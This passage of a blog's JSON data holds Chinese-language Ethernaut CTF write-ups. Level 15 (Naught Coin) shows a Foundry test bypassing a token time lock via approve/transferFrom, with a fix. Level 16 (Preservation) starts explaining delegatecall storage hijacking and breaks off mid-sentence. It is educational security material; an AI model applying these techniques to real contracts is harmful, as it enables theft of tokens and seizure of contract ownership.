深入理解ERC20代币标准的全部接口是至关重要的，包括 `transfer`, `approve`, `transferFrom`, `balanceOf`, `allowance` 等。\n-   **函数覆盖 (`override`)**: 在Solidity中，当子合约需要修改父合约的行为时，使用 `override` 关键字。但必须小心，确保所有相关的行为都被覆盖，以避免产生漏洞。\n-   **Foundry `prank`**: `vm.startPrank` 是模拟特定地址（如 `player`）执行操作的强大工具，使得在测试中模拟多步攻击流程变得简单。\n\n## 🎯 总结\n\n**核心概念**:\n-   ERC20标准定义了一套代币交互的接口，仅仅限制其中一个（`transfer`）是不够的。\n-   `approve` 和 `transferFrom` 的组合是ERC20的一个核心功能，允许第三方代为转移代币。\n-   在进行合约继承和函数覆盖时，必须保持逻辑的一致性，否则很容易引入漏洞。\n\n**攻击向量**:\n-   识别出合约只限制了 `transfer` 函数，而没有限制 `transferFrom` 函数。\n-   利用 `approve` 和 `transferFrom` 的标准功能来绕过不完整的安全限制。\n\n**防御策略**:\n-   在修改继承合约的功能时，进行全面的影响分析，确保所有相关的函数都得到一致的处理。\n-   优先使用经过社区审计和验证的标准实现，而不是自己重新发明轮子。\n\n## 📚 参考资料\n\n-   [ERC20 Token Standard](https://eips.ethereum.org/EIPS/eip-20)\n-   [OpenZeppelin ERC20 Implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol)\n-   [Solidity Docs: Overriding](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding)","slug":"ethernaut-level-15-naught-coin","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpd0015bf5q4u6y1hm6","content":"<h1 id=\"🎯-Ethernaut-Level-15-Naught-Coin-ERC20-approve-transferFrom漏洞\"><a href=\"#🎯-Ethernaut-Level-15-Naught-Coin-ERC20-approve-transferFrom漏洞\" class=\"headerlink\" title=\"🎯 Ethernaut Level 15: Naught Coin - ERC20 approve&#x2F;transferFrom漏洞\"></a>🎯 Ethernaut Level 15: Naught Coin - ERC20 approve&#x2F;transferFrom漏洞</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/15\">Ethernaut Level 15 - Naught Coin</a><br><strong>攻击类型</strong>: ERC20 <code>approve</code>&#x2F;<code>transferFrom</code> 漏洞<br><strong>难度</strong>: ⭐⭐☆☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>作为 <code>player</code>，你初始拥有全部的 <code>NaughtCoin</code> 代币。然而，合约中的 <code>transfer</code> 函数被锁定，十年内无法转移代币。你的目标是在锁定期结束前，将你的全部代币从你的地址中转移出去。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel15.svg\" alt=\"Naught Coin Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p>让我们看一下 <code>NaughtCoin</code> 合约。它继承自 OpenZeppelin 的 <code>ERC20</code> 标准合约。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract NaughtCoin is ERC20 &#123;</span><br><span class=\"line\">    uint public timeLock;</span><br><span class=\"line\">    address public player;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;</span><br><span class=\"line\">        player = _player;</span><br><span class=\"line\">        timeLock = block.timestamp + 10 * 365 days;</span><br><span class=\"line\">        _mint(player, 1000000 * (10**18));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    modifier lockTokens() &#123;</span><br><span class=\"line\">        if (msg.sender == player) &#123;</span><br><span class=\"line\">            require(block.timestamp &gt; timeLock, &quot;NaughtCoin: time lock is active&quot;);</span><br><span class=\"line\">            _;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            _;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // Override transfer to lock tokens for the player</span><br><span class=\"line\">    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) &#123;</span><br><span class=\"line\">        return super.transfer(_to, _value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // Other functions are inherited from ERC20</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>合约通过 <code>override</code> 重写了 <code>transfer</code> 函数，并为其增加了一个 <code>lockTokens</code> 修饰符。这个修饰符会检查 <code>msg.sender</code> 是否为 <code>player</code>，如果是，则要求 <code>block.timestamp</code> 大于 <code>timeLock</code>（十年之后）。这意味着我们作为 <code>player</code>，无法直接调用 <code>transfer</code> 函数来转移代-笔。</p>\n<p>然而，开发者只重写了 <code>transfer</code> 函数，却忽略了 <code>ERC20</code> 标准中的另一个重要的代币转移函数：<code>transferFrom(address from, address to, uint256 amount)</code>。</p>\n<p><code>transferFrom</code> 函数允许一个地址（<code>spender</code>）在得到 <code>owner</code> 授权（<code>approve</code>）后，从 <code>owner</code> 的账户中转移代币到任何地址。</p>\n<p>由于 <code>NaughtCoin</code> 合约没有重写 <code>transferFrom</code>，它将直接使用 OpenZeppelin <code>ERC20</code> 合约中的原始实现，而这个原始实现是没有 <code>lockTokens</code> 修饰符的！</p>\n<p>因此，攻击路径变得清晰：</p>\n<ol>\n<li>我们（<code>player</code>）调用 <code>approve</code> 函数，授权给另一个地址（可以是自己，也可以是任何其他地址）转移我们的全部代币。</li>\n<li>我们（或被授权的地址）调用 <code>transferFrom</code> 函数，将代币从我们的账户中转移出去。</li>\n</ol>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><p>在 Foundry 测试中，我们可以直接模拟这个过程。我们甚至不需要一个单独的攻击合约，因为 <code>player</code> 可以授权给自己来执行 <code>transferFrom</code>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/15_NaughtCoin.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract NaughtCoinTest is Test &#123;</span><br><span class=\"line\">    NaughtCoin instance;</span><br><span class=\"line\">    address player1;</span><br><span class=\"line\">    address player2;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player1 = vm.addr(1);</span><br><span class=\"line\">        player2 = vm.addr(2); // 一个用于接收代币的地址</span><br><span class=\"line\">        instance = new NaughtCoin(player1);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttacker() public &#123;</span><br><span class=\"line\">        vm.startPrank(player1, player1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 获取 player1 的全部余额</span><br><span class=\"line\">        uint256 playerBalance = instance.balanceOf(player1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 步骤 1: player1 授权给 player1 (自己) 转移全部余额</span><br><span class=\"line\">        instance.approve(player1, playerBalance);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 步骤 2: player1 调用 transferFrom 将自己的代币转移到 player2</span><br><span class=\"line\">        instance.transferFrom(player1, player2, playerBalance);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 验证结果</span><br><span class=\"line\">        assertEq(instance.balanceOf(player1), 0);</span><br><span class=\"line\">        assertEq(instance.balanceOf(player2), playerBalance);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>获取余额</strong>: 首先，确定 <code>player</code> 地址拥有的代币总量。</li>\n<li><strong>授权 (<code>approve</code>)</strong>: <code>player</code> 调用 <code>instance.approve(spender, amount)</code>，其中 <code>spender</code> 是被授权的地址，<code>amount</code> 是授权额度。在这里，我们让 <code>player</code> 授权给自己全部余额。</li>\n<li><strong>转移 (<code>transferFrom</code>)</strong>: <code>player</code> 调用 <code>instance.transferFrom(from, to, amount)</code>，其中 <code>from</code> 是 <code>player</code> 地址，<code>to</code> 是接收地址，<code>amount</code> 是要转移的数量。</li>\n</ol>\n<p>这个过程成功地绕过了 <code>transfer</code> 函数的 <code>timeLock</code> 限制。</p>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><p><strong>完整地覆盖函数</strong>: 当继承一个标准（如ERC20）并打算修改其核心功能时，必须确保所有相关的函数都被一致地修改。在这个案例中，如果 <code>transfer</code> 被锁定，那么 <code>transferFrom</code> 也应该被同样的方式锁定。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 正确的修复方式</span><br><span class=\"line\">function transferFrom(address from, address to, uint256 value) public override lockTokens returns (bool) &#123;</span><br><span class=\"line\">    return super.transferFrom(from, to, value);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>使用成熟的代币锁定合约</strong>: 与其自己实现时间锁，不如使用经过审计和广泛使用的解决方案，例如 OpenZeppelin 的 <code>TokenTimelock</code> 合约。这些合约已经考虑了各种边缘情况。</p>\n</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong>ERC20 标准</strong>: 深入理解ERC20代币标准的全部接口是至关重要的，包括 <code>transfer</code>, <code>approve</code>, <code>transferFrom</code>, <code>balanceOf</code>, <code>allowance</code> 等。</li>\n<li><strong>函数覆盖 (<code>override</code>)</strong>: 在Solidity中，当子合约需要修改父合约的行为时，使用 <code>override</code> 关键字。但必须小心，确保所有相关的行为都被覆盖，以避免产生漏洞。</li>\n<li><strong>Foundry <code>prank</code></strong>: <code>vm.startPrank</code> 是模拟特定地址（如 <code>player</code>）执行操作的强大工具，使得在测试中模拟多步攻击流程变得简单。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>ERC20标准定义了一套代币交互的接口，仅仅限制其中一个（<code>transfer</code>）是不够的。</li>\n<li><code>approve</code> 和 <code>transferFrom</code> 的组合是ERC20的一个核心功能，允许第三方代为转移代币。</li>\n<li>在进行合约继承和函数覆盖时，必须保持逻辑的一致性，否则很容易引入漏洞。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>识别出合约只限制了 <code>transfer</code> 函数，而没有限制 <code>transferFrom</code> 函数。</li>\n<li>利用 <code>approve</code> 和 <code>transferFrom</code> 的标准功能来绕过不完整的安全限制。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>在修改继承合约的功能时，进行全面的影响分析，确保所有相关的函数都得到一致的处理。</li>\n<li>优先使用经过社区审计和验证的标准实现，而不是自己重新发明轮子。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://eips.ethereum.org/EIPS/eip-20\">ERC20 Token Standard</a></li>\n<li><a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol\">OpenZeppelin ERC20 Implementation</a></li>\n<li><a href=\"https://docs.soliditylang.org/en/latest/contracts.html#function-overriding\">Solidity Docs: Overriding</a></li>\n</ul>\n","more":"<h1 id=\"🎯-Ethernaut-Level-15-Naught-Coin-ERC20-approve-transferFrom漏洞\"><a href=\"#🎯-Ethernaut-Level-15-Naught-Coin-ERC20-approve-transferFrom漏洞\" class=\"headerlink\" title=\"🎯 Ethernaut Level 15: Naught Coin - ERC20 approve&#x2F;transferFrom漏洞\"></a>🎯 Ethernaut Level 15: Naught Coin - ERC20 approve&#x2F;transferFrom漏洞</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/15\">Ethernaut Level 15 - Naught Coin</a><br><strong>攻击类型</strong>: ERC20 <code>approve</code>&#x2F;<code>transferFrom</code> 漏洞<br><strong>难度</strong>: ⭐⭐☆☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>作为 <code>player</code>，你初始拥有全部的 <code>NaughtCoin</code> 代币。然而，合约中的 <code>transfer</code> 函数被锁定，十年内无法转移代币。你的目标是在锁定期结束前，将你的全部代币从你的地址中转移出去。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel15.svg\" alt=\"Naught Coin Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p>让我们看一下 <code>NaughtCoin</code> 合约。它继承自 OpenZeppelin 的 <code>ERC20</code> 标准合约。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract NaughtCoin is ERC20 &#123;</span><br><span class=\"line\">    uint public timeLock;</span><br><span class=\"line\">    address public player;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;</span><br><span class=\"line\">        player = _player;</span><br><span class=\"line\">        timeLock = block.timestamp + 10 * 365 days;</span><br><span class=\"line\">        _mint(player, 1000000 * (10**18));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    modifier lockTokens() &#123;</span><br><span class=\"line\">        if (msg.sender == player) &#123;</span><br><span class=\"line\">            require(block.timestamp &gt; timeLock, &quot;NaughtCoin: time lock is active&quot;);</span><br><span class=\"line\">            _;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            _;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // Override transfer to lock tokens for the player</span><br><span class=\"line\">    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) &#123;</span><br><span class=\"line\">        return super.transfer(_to, _value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // Other functions are inherited from ERC20</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>合约通过 <code>override</code> 重写了 <code>transfer</code> 函数，并为其增加了一个 <code>lockTokens</code> 修饰符。这个修饰符会检查 <code>msg.sender</code> 是否为 <code>player</code>，如果是，则要求 <code>block.timestamp</code> 大于 <code>timeLock</code>（十年之后）。这意味着我们作为 <code>player</code>，无法直接调用 <code>transfer</code> 函数来转移代-笔。</p>\n<p>然而，开发者只重写了 <code>transfer</code> 函数，却忽略了 <code>ERC20</code> 标准中的另一个重要的代币转移函数：<code>transferFrom(address from, address to, uint256 amount)</code>。</p>\n<p><code>transferFrom</code> 函数允许一个地址（<code>spender</code>）在得到 <code>owner</code> 授权（<code>approve</code>）后，从 <code>owner</code> 的账户中转移代币到任何地址。</p>\n<p>由于 <code>NaughtCoin</code> 合约没有重写 <code>transferFrom</code>，它将直接使用 OpenZeppelin <code>ERC20</code> 合约中的原始实现，而这个原始实现是没有 <code>lockTokens</code> 修饰符的！</p>\n<p>因此，攻击路径变得清晰：</p>\n<ol>\n<li>我们（<code>player</code>）调用 <code>approve</code> 函数，授权给另一个地址（可以是自己，也可以是任何其他地址）转移我们的全部代币。</li>\n<li>我们（或被授权的地址）调用 <code>transferFrom</code> 函数，将代币从我们的账户中转移出去。</li>\n</ol>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><p>在 Foundry 测试中，我们可以直接模拟这个过程。我们甚至不需要一个单独的攻击合约，因为 <code>player</code> 可以授权给自己来执行 <code>transferFrom</code>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/15_NaughtCoin.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract NaughtCoinTest is Test &#123;</span><br><span class=\"line\">    NaughtCoin instance;</span><br><span class=\"line\">    address player1;</span><br><span class=\"line\">    address player2;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player1 = vm.addr(1);</span><br><span class=\"line\">        player2 = vm.addr(2); // 一个用于接收代币的地址</span><br><span class=\"line\">        instance = new NaughtCoin(player1);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttacker() public &#123;</span><br><span class=\"line\">        vm.startPrank(player1, player1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 获取 player1 的全部余额</span><br><span class=\"line\">        uint256 playerBalance = instance.balanceOf(player1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 步骤 1: player1 授权给 player1 (自己) 转移全部余额</span><br><span class=\"line\">        instance.approve(player1, playerBalance);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 步骤 2: player1 调用 transferFrom 将自己的代币转移到 player2</span><br><span class=\"line\">        instance.transferFrom(player1, player2, playerBalance);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 验证结果</span><br><span class=\"line\">        assertEq(instance.balanceOf(player1), 0);</span><br><span class=\"line\">        assertEq(instance.balanceOf(player2), playerBalance);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>获取余额</strong>: 首先，确定 <code>player</code> 地址拥有的代币总量。</li>\n<li><strong>授权 (<code>approve</code>)</strong>: <code>player</code> 调用 <code>instance.approve(spender, amount)</code>，其中 <code>spender</code> 是被授权的地址，<code>amount</code> 是授权额度。在这里，我们让 <code>player</code> 授权给自己全部余额。</li>\n<li><strong>转移 (<code>transferFrom</code>)</strong>: <code>player</code> 调用 <code>instance.transferFrom(from, to, amount)</code>，其中 <code>from</code> 是 <code>player</code> 地址，<code>to</code> 是接收地址，<code>amount</code> 是要转移的数量。</li>\n</ol>\n<p>这个过程成功地绕过了 <code>transfer</code> 函数的 <code>timeLock</code> 限制。</p>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><p><strong>完整地覆盖函数</strong>: 当继承一个标准（如ERC20）并打算修改其核心功能时，必须确保所有相关的函数都被一致地修改。在这个案例中，如果 <code>transfer</code> 被锁定，那么 <code>transferFrom</code> 也应该被同样的方式锁定。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 正确的修复方式</span><br><span class=\"line\">function transferFrom(address from, address to, uint256 value) public override lockTokens returns (bool) &#123;</span><br><span class=\"line\">    return super.transferFrom(from, to, value);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>使用成熟的代币锁定合约</strong>: 与其自己实现时间锁，不如使用经过审计和广泛使用的解决方案，例如 OpenZeppelin 的 <code>TokenTimelock</code> 合约。这些合约已经考虑了各种边缘情况。</p>\n</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong>ERC20 标准</strong>: 深入理解ERC20代币标准的全部接口是至关重要的，包括 <code>transfer</code>, <code>approve</code>, <code>transferFrom</code>, <code>balanceOf</code>, <code>allowance</code> 等。</li>\n<li><strong>函数覆盖 (<code>override</code>)</strong>: 在Solidity中，当子合约需要修改父合约的行为时，使用 <code>override</code> 关键字。但必须小心，确保所有相关的行为都被覆盖，以避免产生漏洞。</li>\n<li><strong>Foundry <code>prank</code></strong>: <code>vm.startPrank</code> 是模拟特定地址（如 <code>player</code>）执行操作的强大工具，使得在测试中模拟多步攻击流程变得简单。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>ERC20标准定义了一套代币交互的接口，仅仅限制其中一个（<code>transfer</code>）是不够的。</li>\n<li><code>approve</code> 和 <code>transferFrom</code> 的组合是ERC20的一个核心功能，允许第三方代为转移代币。</li>\n<li>在进行合约继承和函数覆盖时，必须保持逻辑的一致性，否则很容易引入漏洞。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>识别出合约只限制了 <code>transfer</code> 函数，而没有限制 <code>transferFrom</code> 函数。</li>\n<li>利用 <code>approve</code> 和 <code>transferFrom</code> 的标准功能来绕过不完整的安全限制。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>在修改继承合约的功能时，进行全面的影响分析，确保所有相关的函数都得到一致的处理。</li>\n<li>优先使用经过社区审计和验证的标准实现，而不是自己重新发明轮子。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://eips.ethereum.org/EIPS/eip-20\">ERC20 Token Standard</a></li>\n<li><a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol\">OpenZeppelin ERC20 Implementation</a></li>\n<li><a href=\"https://docs.soliditylang.org/en/latest/contracts.html#function-overriding\">Solidity Docs: Overriding</a></li>\n</ul>\n"},{"title":"Ethernaut Level 16: Preservation - Delegatecall与存储布局操纵","date":"2025-01-25T08:25:00.000Z","updated":"2025-01-25T08:25:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"深入剖析 `delegatecall` 的危险性以及存储布局不匹配如何导致致命漏洞。通过两次 `delegatecall` 调用，完全控制目标合约的 `owner`，掌握 Preservation 关卡的破解技巧。","_content":"\n# 🎯 Ethernaut Level 16: Preservation - Delegatecall与存储布局操纵\n\n> **关卡链接**: [Ethernaut Level 16 - Preservation](https://ethernaut.openzeppelin.com/level/16)  \n> **攻击类型**: `delegatecall` 存储布局操纵  \n> **难度**: ⭐⭐⭐⭐☆\n\n## 📋 挑战目标\n\n本关的目标是获取 `Preservation` 合约的所有权，即成为该合约的 `owner`。\n\n![Preservation Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel16.svg)\n\n## 🔍 漏洞分析\n\n`Preservation` 合约的 `owner` 是私有的，并且没有直接的函数来修改它。漏洞隐藏在使用 `delegatecall` 的 `setFirstTime` 和 `setSecondTime` 函数中。\n\n```solidity\ncontract Preservation {\n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner;\n    uint storedTime;\n\n    // ... constructor ...\n\n    function setFirstTime(uint _timeStamp) public {\n        timeZone1Library.delegatecall(abi.encodePacked(bytes4(keccak256(\"setTime(uint256)\")), _timeStamp));\n    }\n\n    function setSecondTime(uint _timeStamp) public {\n        timeZone2Library.delegatecall(abi.encodePacked(bytes4(keccak256(\"setTime(uint256)\")), _timeStamp));\n    }\n}\n```\n\n`delegatecall` 是一个非常危险的操作码。它会在调用者合约的上下文中执行另一个合约的代码。这意味着，被调用合约（`library`）的代码可以修改调用者合约（`Preservation`）的存储。\n\n当 `setFirstTime` 通过 `delegatecall` 调用 `timeZone1Library` 的 `setTime` 函数时，`setTime` 函数修改的存储槽位是 `Preservation` 合约的槽位。\n\n让我们比较一下 `Preservation` 和 `LibraryContract` 的存储布局：\n\n| Slot | `Preservation` 合约 | `LibraryContract` 合约 |\n| :--- | :------------------ | :--------------------- |\n| 0    | `timeZone1Library`  | `storedTime`           |\n| 1    | `timeZone2Library`  | (未使用)               |\n| 2    | `owner`             | (未使用)               |\n| 3    | `storedTime`        | (未使用)               |\n\n当 `LibraryContract.setTime(uint)` 被 `delegatecall` 调用时，它以为自己在修改 `storedTime`（位于 slot 0）。但实际上，它修改的是 `Preservation` 合约的 slot 0，也就是 `timeZone1Library` 的地址！\n\n这就给了我们一个攻击路径：\n\n1.  **第一次调用 `setFirstTime`**: 我们传入一个精心构造的 `_timeStamp`，这个 `_timeStamp` 其实是我们的攻击合约的地址。这次调用会把 `Preservation` 合约的 `timeZone1Library` (slot 0) 修改为我们的攻击合约地址。\n2.  **创建攻击合约**: 我们的攻击合约需要有一个 `setTime(uint)` 函数。但是，这个函数的实现不是为了设置时间，而是为了修改 